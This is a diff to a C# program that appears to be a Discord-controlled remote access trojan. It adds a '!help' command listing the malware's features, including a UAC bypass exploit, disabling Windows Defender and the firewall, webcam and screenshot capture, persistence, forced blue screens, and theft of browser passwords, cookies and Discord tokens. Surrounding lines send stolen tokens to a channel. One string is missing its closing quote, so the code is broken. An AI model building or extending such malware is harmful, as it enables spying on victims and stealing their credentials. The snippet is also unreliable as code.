@@ -625,6 +625,51 @@ class Program
             await Send_message(channelid, tokensCanary);
             await Send_message(channelid, tokensWeb);
         }
+        else if (message.StartsWith("!help")) 
+        {
+            string helpMessage = "Here are the list of commands available: \n" +
+                "!ping - tests if the connection is working \n" +
+                "!whoami - shows the username of the current user \n" +
+                "!message hi - shows a message box with the text 'hi' \n" +
+                "!privs - shows the privilege level of the program \n" +
+                "!uac - elevate uac to gain admin privileges using silent disk cleanup exploit \n" +
+                "!cd C:\\ - change the working directory of the program \n" +
+                "!dir - shows all items in the current directory \n" +
+                "!download *file* - downloads the attached file from the computer \n" +
+                "!upload *file* - uploads the attached file to the computer \n" +
+                "!delete filename - deletes the specified file \n" +
+                "!audio *file* - play an audio file on the computer \n" +
+                "!voice hi - makes the computer say 'hi' out loud \n" +
+                "!wallpaper *image* - changes the computer wallpaper to the attached image \n" +
+                "!clipboard - retrieves the computer's clipboard content \n" +
+                "!idletime - shows the idle time of the computer \n" +
+                "!block - blocks the computer's keyboard and mouse inputs but only if the program is running with admin privileges \n" +
+                "!unblock - unblocks the computer's keyboard and mouse inputs but only if the program is running with admin privileges \n" +
+                "!screenshot - takes a screenshot of the computer \n" +
+                "!webcam - takes a photo of from the webcam \n" +
+                "!close - kills the current running process (end the connection) \n" +
+                "!uninstall - kills the current running process and deletes all traces of itself from the computer (clean computer) \n" +
+                "!shutdown - shut down the computer \n" +
+                "!restart - restart the computer \n" +
+                "!logoff - log off the current user \n" +
+                "!lock - lock the computer \n +
+                "!BSOD - cause a blue screen on the computer but only if the program is running with admin privileges \n" +
+                "!plist - lists all running processes \n" +
+                "!pkill processname - kills the specified process \n" +
+                "!defender = Disable windows defender \n" +
+                "!firewall = Disable windows firewall \n" +
+                "!task = Disable windows task manager \n" +
+                "!crit = Make program a critical process (closed = computer will bluescreen) but only if the program is running with admin privileges \n" +
+                "!uncrit = Make program not a critical process but only if the program is running with admin privileges \n" +
+                "!website url - open a website on the computer \n" +
+                "!startup - create a scheduled task to run the program on startup with admin privileges if possible or as a normal user \n" +
+                "!geolocate - get the coordinates of the users IP and the computers built in geolocation \n" +
+                "!password - recover passwords from MSedge, Chrome, Firefox, Brave, OperaGX (W.I.P) \n" +
+                "!cookie - recover cookies from MSedge, Chrome, Firefox, Brave, OperaGX (W.I.P) \n" +
+                "!token - recover discord tokens from discord, canary and web sessions (W.I.P) \n" +
+                "!help - list all commands";
+            await Send_message(channelid, helpMessage);
+        }
         
     }
 }
